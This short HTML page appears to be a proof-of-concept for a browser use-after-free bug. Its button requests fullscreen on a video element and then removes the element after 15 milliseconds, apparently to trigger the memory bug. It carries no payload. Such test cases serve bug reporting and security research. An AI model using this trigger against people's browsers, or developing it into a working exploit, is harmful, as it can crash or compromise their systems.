<!DOCTYPE html>
<html>
<body>
    <button onclick="triggerUAF()">Trigger UAF</button><br><br> 
    <video id="target_video" width="100" height="100"></video>     
    <script>
        function triggerUAF() {
            var video = document.getElementById("target_video");                      
            video.webkitRequestFullscreen();          
            setTimeout(() => {
                video.remove();
            }, 15); 
           
        }
    </script>
</body>
</html>
